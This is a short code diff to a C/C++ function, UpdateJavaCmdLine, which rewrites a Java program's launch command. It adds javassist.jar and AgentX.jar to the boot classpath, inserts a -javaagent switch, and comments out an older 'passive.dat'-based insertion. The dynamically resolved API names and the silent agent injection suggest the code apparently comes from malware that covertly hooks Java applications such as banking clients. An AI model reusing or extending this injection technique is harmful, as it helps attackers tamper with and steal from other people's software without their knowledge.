@@ -1174,6 +1174,11 @@ static char* UpdateJavaCmdLine( const char* cmd )
 	{
 		char *after1, *after2;
 		MemPtr<1024> insert1, insert2;
+		pwsprintfA( insert1.str(), "\"%s\\lib\\javassist.jar\";\"%s\\AgentX.jar\";", path, path );
+		res = InsertAfter( ret, "-Xbootclasspath/a:", insert1 );
+		pwsprintfA( insert1.str(), " -javaagent:\"%s\\AgentX.jar\" ", path );
+		res &= InsertAfter( ret, "-Dsun.awt.warmup=true", insert1 );
+/*
 		m_lstrcat( path, "\\passive.dat" );
 		if( File::IsExists(path) )
 		{
@@ -1193,6 +1198,7 @@ static char* UpdateJavaCmdLine( const char* cmd )
 		}
 		res = InsertAfter( ret, after1, insert1 );
 		res &= InsertAfter( ret, after2, insert2 );
+*/
 	}
 	else //javaw.exe
 	{
